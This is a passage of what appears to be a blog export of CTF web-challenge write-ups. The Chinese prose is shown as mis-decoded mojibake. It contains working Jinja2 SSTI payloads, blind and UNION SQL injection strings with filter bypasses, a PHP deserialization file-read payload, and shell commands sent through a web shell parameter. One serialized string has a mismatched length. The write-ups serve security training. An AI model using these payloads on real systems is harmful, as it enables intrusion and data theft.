class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ç¨‹åºå¼€å§‹ï¼š&quot;</span>)</span><br><span class="line">    fileNames = os.listdir(filePath)</span><br><span class="line">    startTime = time.time()</span><br><span class="line">    executor = ThreadPoolExecutor(<span class="number">100</span>)</span><br><span class="line">    all_tasks = [executor.submit(exp, file) <span class="keyword">for</span> file <span class="keyword">in</span> fileNames]</span><br><span class="line">    wait(all_tasks, return_when=ALL_COMPLETED)</span><br><span class="line">    endTime = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;total time is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(endTime - startTime)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ç¨‹åºç»“æŸï¼&quot;</span>)</span><br></pre></td></tr></table></figure></p>
<p>è¿™æ˜¯æœ€ç»ˆç‰ˆçš„è„šæœ¬ã€‚ä¹‹å‰ç”¨çš„å•çº¿ç¨‹ï¼Œå¯èƒ½è·‘ä¸€å¤©éƒ½è·‘ä¸å‡ºæ¥ï¼Œå¦‚æœå¼€å¯å¤šçº¿ç¨‹ï¼ŒBUUOJè¿™ä¸ªç½‘å€å°±ä¼šè¿”å› <code>too many requests</code> ã€‚å› æ­¤æœ€ç»ˆçš„è§£å†³åŠæ³•å°±æ˜¯åœ¨è‡ªå·±ä¸»æœºä¸Šæ­å»ºç¯å¢ƒï¼Œç„¶åæµ‹è¯•ã€‚</p>
<p>æœ€ç»ˆç»“æœï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329084725.png" /></p>
<p>æœ€ç»ˆè·‘äº†3ä¸ªå¤šå°æ—¶ï¼Œç”±äºæˆ‘ä»£ç èƒ½åŠ›å·®ï¼Œå› ä¸ºå¦‚æœå„ä½æœ‰æ›´å¥½çš„ä¼˜åŒ–æ–¹æ³•å¯ä»¥å‘Šè¯‰æˆ‘ã€‚</p>
<p>æ‹¿åˆ° <code>æ–‡ä»¶</code> <code>payload</code> <code>æäº¤åŠæ³•</code> åå°±å¯ä»¥å‘½ä»¤æ‰§è¡Œäº†ã€‚ï¼ˆè¿™é‡Œæ˜¯ GET æ–¹å¼ï¼Œæ‰€ä»¥æ— æ³•ç”¨èšå‰‘è¿æ¥ï¼Œåœ¨è‡ªå·±ä¸»æœºä¸Šæµ‹è¯•è¿‡ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. /xk0SzyKwfzw.php?Efa5BVG=ls / # æŸ¥çœ‹æ ¹ç›®å½•æ–‡ä»¶ï¼Œå‘ç° flag</span><br><span class="line">2. /xk0SzyKwfzw.php?Efa5BVG=cat /flag # flag get</span><br></pre></td></tr></table></figure>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>æœ¬é¢˜è€ƒå¯Ÿçš„å¹¶ä¸æ˜¯ä»£ç å®¡è®¡ï¼Œè€Œæ˜¯è„šæœ¬ç¼–å†™èƒ½åŠ›ã€‚ä¸è®ºæ€ä¹ˆè¯´ï¼Œè¿˜çœŸæ˜¯ä¸€é“æœ‰æ„æ€çš„é¢˜ç›®å‘€ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>æ”»é˜²ä¸–ç•Œ_shrine</title>
    <url>/2022/04/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_shrine/</url>
    <content><![CDATA[<p>é¢˜ç›®åœ°å€ï¼šhttps://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5422&amp;page=1</p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒä¼šçœ‹åˆ°ä¸€å †ä»£ç ï¼Œæ˜¯æ— åºçš„ï¼Œä½†æ˜¯æŸ¥çœ‹é¡µé¢æºç å°±ä¼šå¾—åˆ°æ•´é½çš„ä»£ç ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></p>
<ul>
<li>ç¬¬ä¸€ï¼Œç”±<code>app.config['FLAG'] = os.environ.pop('FLAG')</code>ï¼ŒçŸ¥é“flagåœ¨<code>app.config['FLAG']</code>é‡Œï¼›</li>
<li>ç¬¬äºŒå¯ä»¥è®¿é—®/shrine/xxxï¼›</li>
<li>ç¬¬ä¸‰ï¼Œ<code>(, ), config, self</code>è¢«ç¦ç”¨ï¼Œé‚£ä¹ˆä¼ ç»Ÿçš„æ¨¡æ¿æ³¨å…¥å°±ä¸è¡Œäº†ã€‚</li>
</ul>
<p>æŸ¥çœ‹æ˜¯å¦å­˜åœ¨SSTIï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. shrine/$&#123;7*7&#125; # ç»“æœ $&#123;7*7&#125;</span><br><span class="line">2. shrine/&#123;&#123;7*7&#125;&#125; # ç»“æœ 49</span><br><span class="line">3. shrine/&#123;&#123;7*&#x27;7&#x27;&#125;&#125; # ç»“æœ 7777777</span><br></pre></td></tr></table></figure>
<p>å­˜åœ¨SSTIï¼Œå¹¶ä¸”æ¨¡æ¿å¼•æ“ä¸ºJinjia2æˆ–è€…flaskã€‚</p>
<h1 id="è§£é¢˜">è§£é¢˜</h1>
<p>è¿™é‡Œå› ä¸ºè¿‡æ»¤äº†ä¼ ç»ŸSSTIæ‰€å¿…é¡»çš„ä¸€äº›å­—ç¬¦ï¼Œå› æ­¤å¾—ä½¿ç”¨å…¶ä»–åŠæ³•ã€‚åˆå› ä¸ºflagåœ¨ç¯å¢ƒå˜é‡ä¸­ï¼Œè€ƒè™‘ç›´æ¥è¯»å–ã€‚</p>
<p>è¯»å–å†…å®¹ã€‚ <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> &#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config[<span class="string">&#x27;FLAG&#x27;</span>]&#125;&#125;</span><br><span class="line"><span class="number">2.</span> &#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config[<span class="string">&#x27;FLAG&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>ç›´æ¥å¾—åˆ°flagï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405155128.png" /></p>
]]></content>
      <categories>
        <category>SSTI</category>
      </categories>
      <tags>
        <tag>Flask</tag>
        <tag>Jinjia2</tag>
      </tags>
  </entry>
  <entry>
    <title>æå®¢å¤§æŒ‘æˆ˜ 2019 FinalSQL</title>
    <url>/2022/04/17/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%20FinalSQL/</url>
    <content><![CDATA[<p>é¢˜ç›®åœ°å€ï¼š<a href="https://buuoj.cn/challenges#%5Bæå®¢å¤§æŒ‘æˆ˜%202019%5DFinalSQL">FinalSQL</a></p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥é¡µé¢ï¼Œç»è¿‡ç›¸å…³çš„æµ‹è¯•ï¼Œå‘ç°äº†ä¸‰ä¸ªå¯èƒ½çš„æ³¨å…¥ç‚¹ï¼šç”¨æˆ·åã€å¯†ç å’Œç‚¹å‡»æ•°å­—å°æ–¹æ¡†ä¹‹åurlå‡ºç°çš„idã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220417181329.png" /></p>
<p>å¹¶ä¸”ï¼Œæ ¹æ®æœ€ä¸Šé¢çš„æç¤ºï¼Œæœ¬é¢˜ä¼°è®¡æ˜¯sqlç›²æ³¨ã€‚</p>
<h1 id="è§£é¢˜">è§£é¢˜</h1>
<p>é¦–å…ˆä»¥ä¸ºæ³¨å…¥ç‚¹åœ¨ç”¨æˆ·åå’Œå¯†ç ï¼Œå°±å¯¹å…¶è¿›è¡Œäº†æ¨¡ç³Šæµ‹è¯•ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220417181744.png" /></p>
<p>å‘ç°è¿‡æ»¤äº†è®¸å¤šä¸œè¥¿ï¼Œè€Œä¸”æ— æ³•ç»•è¿‡ã€‚åæ¥æ‰¾åˆ°äº†å½“è¾“å…¥<code>\</code>æ—¶ï¼Œç³»ç»ŸæŠ¥é”™äº†ï¼Œæˆ‘æ¬£å–œè‹¥ç‹‚ï¼Œä»¥ä¸ºè¿™é‡Œå°±æ˜¯æ³¨å…¥ç‚¹ï¼Œå¹¶ä¸”ä¹‹å‰è¿˜è®°å½•äº†[[è¿‡æ»¤å•å¼•å·çš„æ³¨å…¥æ–¹æ³•]]ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220417181822.png" /></p>
<p>ç»è¿‡æµ‹è¯•ï¼Œè¿™é‡Œç¡®å®å­˜åœ¨ç€æ³¨å…¥ç‚¹ï¼Œä½†æ˜¯è®¸å¤šè¦ä½¿ç”¨çš„å…³é”®è¯éƒ½è¢«è¿‡æ»¤äº†ï¼Œæ¯”å¦‚<code>or</code>ã€<code>and</code>ç­‰ï¼Œå¯¼è‡´æ— æ³•ç»•è¿‡ã€‚</p>
<p>ä¹‹åæˆ‘åˆå»å°è¯•äº†ä¸€ä¸‹ç¬¬ä¸‰ä¸ªå¯èƒ½çš„æ³¨å…¥ç‚¹ï¼Œå½“æˆ‘è¾“å…¥å¦‚ä¸‹å€¼æ—¶ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1=1 # NO! Not this! Click others</span><br><span class="line">?id=1=2 # ERROR!!!</span><br></pre></td></tr></table></figure></p>
<p>è§‰å¾—è¿™é‡Œå­˜åœ¨ç€æ³¨å…¥ç‚¹ï¼Œåˆç»è¿‡äº†ä¸æ–­å°è¯•ï¼Œç¡®å®šäº†æ³¨å…¥ç‚¹å°±åœ¨<code>id</code>ï¼Œå¹¶ä¸”å‚æ•°å€¼æ­£ç¡®çš„æ—¶å€™è¿”å›çš„å°±æ˜¯è¯¥é¡µé¢æœ¬æ¥çš„å†…å®¹ï¼Œå½“å‚æ•°å€¼ä¸æ­£ç¡®çš„æ—¶å€™è¿”å›çš„å°±æ˜¯<code>ERROR!!!</code>ã€‚</p>
<p>éšåæˆ‘è¿›è¡Œäº†æ¨¡ç³Šæµ‹è¯•</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220417182427.png" /></p>
<p>ï¼ˆå…¶ä¸­é•¿åº¦890çš„éƒ½æ˜¯è¢«è¿‡æ»¤äº†ï¼‰</p>
<p>ç”±äºè¿™é‡Œæ²¡æœ‰å›æ˜¾ï¼Œå› æ­¤å°è¯•ç›²æ³¨ï¼ˆè„šæœ¬å»ºè®®è‡ªå·±å†™ï¼Œè¿™é¢˜çš„flagå­—æ®µå†…å®¹éå¸¸å¤šï¼Œå°±ç¦»è°±ï¼‰ã€‚payloadå¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ•°æ®åº“é•¿åº¦: </span><br><span class="line">	å¼‚æˆ–: ?id=0^(length(database())=4) </span><br><span class="line">	or: ?id=(0)or(length(database())=4) # ä¸‹é¢çš„ä¹Ÿå¯ä»¥ç”¨or</span><br><span class="line"></span><br><span class="line">æ•°æ®åº“å: ?id=0^(ascii(substr(database(),%d,1))=%d) -&gt; geek</span><br><span class="line"></span><br><span class="line">è¡¨åï¼š?id=0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))=%d) -&gt; F1naI1y,Flaaaaag</span><br><span class="line"></span><br><span class="line">å­—æ®µå: ?id=0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;,%d,1))=%d) -&gt; id,username,password</span><br><span class="line"></span><br><span class="line">å­—æ®µä¿¡æ¯: ?id=0^(ascii(substr(reverse((select(group_concat(password))from(F1naI1y))),%d,1))=%d)</span><br><span class="line">(æœ€åéå¸¸çš„é˜´é—´ï¼ï¼ï¼flagåœ¨æœ€åé¢ï¼Œæ‰€ä»¥æˆ‘å€’ç€æ±‚ï¼Œå¦‚æœæ­£ç€ï¼Œæ€»å…±æœ‰200+ä¸ªå­—ç¬¦ï¼ï¼ï¼)</span><br></pre></td></tr></table></figure></p>
<hr />
<p>è¿™é‡Œè§£é‡Šä¸€ä¸‹å¼‚æˆ–ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0^0 -&gt; 0</span><br><span class="line">0^1 -&gt; 1</span><br><span class="line">1^0 -&gt; 1</span><br><span class="line">1^1 -&gt; 0</span><br></pre></td></tr></table></figure></p>
<p>ä»¥æ•°æ®åº“é•¿åº¦çš„payloadä¸ºä¾‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¦‚æœè¿™ä¸ªä¸ºçœŸ(length(database())=4)ï¼Œå³å€¼ä¸º1ï¼Œé‚£ä¹ˆ?id=0^1=1ï¼Œä»è€Œæ˜¾ç¤ºæ­£ç¡®çš„é¡µé¢å†…å®¹ã€‚</span><br><span class="line">å¦‚æœè¿™ä¸ªä¸ºå‡(length(database())=3)ï¼Œå³å€¼ä¸º0ï¼Œé‚£ä¹ˆ?id=0^0=0ï¼Œä»è€Œæ˜¾ç¤ºé”™è¯¯çš„é¡µé¢å†…å®¹ã€‚</span><br></pre></td></tr></table></figure></p>
<p>å› æ­¤ï¼Œå½“<code>or</code>å’Œ<code>and</code>éƒ½è¢«è¿‡æ»¤çš„æ—¶å€™ï¼Œå¯ä»¥è€ƒè™‘ä¸€ä¸‹å¼‚æˆ–ã€‚</p>
<hr />
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>ç½‘é¼æ¯ 2018 Fakebook</title>
    <url>/2022/03/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%20Fakebook/</url>
    <content><![CDATA[<p>BUUCTF ç½‘å€ï¼šhttps://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒï¼Œæœ‰ <code>login</code> å’Œ <code>join</code> ä¸¤ä¸ªæŒ‰é’®ï¼Œå…ˆç”¨ admin å¼±å£ä»¤æµ‹è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°ç™»é™†å¤±è´¥ï¼Œå°±å°è¯•æ³¨å†Œä¸€ä¸ªè´¦å·ã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ blog é‚£ä¸€æ åº”è¯¥æœ‰ç‰¹æ®Šçš„éªŒè¯ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨ <code>123.blog</code> æˆåŠŸæ³¨å†Œã€‚</p>
<p>ç™»å½•æˆåŠŸåå‘ç°usernameå¯ä»¥ç‚¹å‡»ï¼Œç‚¹å‡»ä¹‹å url å‡ºç°äº†ä¸€ä¸ª no å‚æ•°ï¼Œå› æ­¤æµ‹è¯•ä¸€ä¸‹æ˜¯å¦å­˜åœ¨ sql æ³¨å…¥ã€‚ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321162039.png" /></p>
<h1 id="ç¬¬ä¸€æ¬¡sqlæ³¨å…¥">ç¬¬ä¸€æ¬¡sqlæ³¨å…¥</h1>
<p>å…ˆç”¨å¦‚ä¸‹payloadæµ‹è¯•ï¼Œå‘ç°æ³¨å…¥ç‚¹çš„é—­åˆæ–¹å¼ä¸ºç©ºã€‚æ¥ä¸‹æ¥å°±æ˜¯å¸¸è§„çš„æ³¨å…¥è¿‡ç¨‹ã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=1=1</span><br><span class="line">?no=1=2</span><br></pre></td></tr></table></figure></p>
<p>ç„¶å fuzz ä»¥ä¸‹ï¼Œå‘ç°æ²¡æœ‰å­—ç¬¦è¢«è¿‡æ»¤ï¼ˆå¯èƒ½æ˜¯æˆ‘çš„å­—å…¸å¤ªå°äº†ï¼‰</p>
<h2 id="è·å–å­—æ®µæ•°">è·å–å­—æ®µæ•°</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=1 order by 4</span><br></pre></td></tr></table></figure>
<h2 id="æµ‹è¯•æ˜¾ç¤ºä½">æµ‹è¯•æ˜¾ç¤ºä½</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union select 1,2,3,4</span><br></pre></td></tr></table></figure>
<p>å‘ç°è¿™ä¸ªpayloadè¢«è¿‡æ»¤äº†ã€‚ä½†æ˜¯ç©ºæ ¼ï¼Œ é€—å·ï¼Œunionï¼Œselectéƒ½æ²¡æœ‰è¢«è¿‡æ»¤ã€‚ç»è¿‡å¤šæ¬¡æµ‹è¯•ï¼Œå‘ç°åå°åº”è¯¥æ£€æµ‹çš„æ˜¯<code>union select</code>ï¼Œé‚£ä¹ˆpayloadè®¾ç½®ä¸º <code>union/**/select</code> å³å¯ç»•è¿‡ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,4</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321162640.png" /></p>
<p>ä¸Šé¢çš„ä¿¡æ¯å¾ˆä¸°å¯Œï¼š</p>
<ul>
<li><strong>Notice</strong>: unserialize(): Error at offset 0 of 1 bytes in <strong>/var/www/html/view.php</strong> on line <strong>31</strong> å­˜åœ¨ååºåˆ—åŒ–</li>
<li>æ˜¾ç¤ºä½ä¸º 2</li>
<li>åœ°å€ä¸ºï¼š<strong>/var/www/html/view.php</strong></li>
</ul>
<h2 id="å¸¸è§„æ³¨å…¥">å¸¸è§„æ³¨å…¥</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?no=-1 union/**/select 1,database(),3,4</span><br><span class="line">2. ?no=-1 union/**/select 1,user(),3,4</span><br><span class="line">3. ?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()</span><br><span class="line">4. ?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">5. ?no=-1 union/**/select 1,no,3,4 from fakebook.users</span><br></pre></td></tr></table></figure>
<p>è·å¾—çš„ç»“æœä¾æ¬¡æ˜¯ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fakebook</span><br><span class="line">root@localhost</span><br><span class="line">users</span><br><span class="line">no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span><br><span class="line">1</span><br><span class="line">hdf</span><br><span class="line">3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2</span><br><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:8:&quot;123.blog&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>æ¥ä¸‹æ¥å°±ä¸çŸ¥é“è¯¥å¦‚ä½•æ˜¯å¥½äº†ï¼Œå¦‚æœæ˜¯å•çº¯çš„ sql æ³¨å…¥ï¼Œåº”è¯¥ä¼šæ˜¾ç¤ºå‡º flagï¼Œè¿™æ˜æ˜¾æ˜¯ä¿¡æ¯æ”¶é›†çš„è¿˜ä¸å¤Ÿã€‚</p>
<h1 id="ä¿¡æ¯æ”¶é›†">ä¿¡æ¯æ”¶é›†</h1>
<p>æƒ³åˆ° <code>robots.txt</code> çœ‹ä¸€ä¸‹ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /user.php.bak</span><br></pre></td></tr></table></figure></p>
<p>å‘ç°å­˜åœ¨ç€å¤‡ä»½æ–‡ä»¶æ³„éœ²ï¼Œä¸‹è½½æ‰“å¼€å¾—åˆ°å¦‚ä¸‹ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>ï¼ˆè¿™é‡Œä¹Ÿè¯´æ˜ï¼Œblogæ˜¯æœ‰ç‰¹æ®Šçš„æ ¼å¼è¦æ±‚çš„ã€‚ï¼‰</p>
<p>å‘ç°ç¡®å®å­˜åœ¨åºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œæ³¨æ„åˆ° <code>function get($url)</code> å’Œ <code>public function getBlogContents ()</code> å¯ä»¥è¯»å–æ–‡ä»¶å†…å®¹ï¼Œå¹¶ä¸”ä¸Šé¢å·²ç»å¾—åˆ°æ–‡ä»¶è·¯å¾„äº†ï¼Œé‚£ä¹ˆçŒœæµ‹flagæ‰€åœ¨çš„æ–‡ä»¶è·¯å¾„ä¸ºï¼š<code>/var/www/html/flag.php</code>ã€‚</p>
<p>ç¼–å†™å¦‚ä¸‹è„šæœ¬ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;hdf&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> UserInfo;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>å¾—åˆ°ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;blog&quot;;s:29:&quot;/var/www/html/flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>é‚£ä¹ˆæ¥ä¸‹æ¥é—®é¢˜å°±æ˜¯å“ªé‡Œä¼ å…¥æˆ‘ä»¬æ„é€ çš„åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ã€‚</p>
<h1 id="ç¬¬äºŒæ¬¡sqlæ³¨å…¥">ç¬¬äºŒæ¬¡sqlæ³¨å…¥</h1>
<p>æ³¨æ„åŠ›å›åˆ°ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,4</span><br></pre></td></tr></table></figure></p>
<p>æ³¨æ„åˆ°4ä¸ªå­—æ®µé¡ºåºï¼š<code>no,username,passwd,data</code> ï¼ŒçŒœæµ‹åˆ†åˆ«å¯¹åº” 1ï¼Œ2ï¼Œ3ï¼Œ4ã€‚å¹¶ä¸” data å­—æ®µè¿”å›çš„æ˜¯ä¸€ä¸ªåºåˆ—åŒ–åçš„è¿‡ç¨‹ã€‚å› æ­¤ï¼Œåšä¸€ä¸ªå‡è®¾ï¼š</p>
<p><strong>åå°çš„å·¥ä½œæ¨¡å¼ï¼šå…ˆç”¨ no è¿›è¡Œç¬¬ä¸€æ¬¡æŸ¥è¯¢ï¼Œç„¶åå¾—åˆ°å¯¹åº”çš„ <code>no,username,passwd,data</code> ä¿¡æ¯ã€‚æ¥ç€å°† data å­—æ®µè¿›è¡Œååºåˆ—åï¼Œè·å–å¯¹åº”åœ°å€çš„å†…å®¹ã€‚</strong></p>
<p>å› æ­¤ï¼Œå°†ä¸Šè¿°åºåˆ—åŒ–åçš„å­—ç¬¦å¸¦å…¥å¾—åˆ°å¦‚ä¸‹payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure></p>
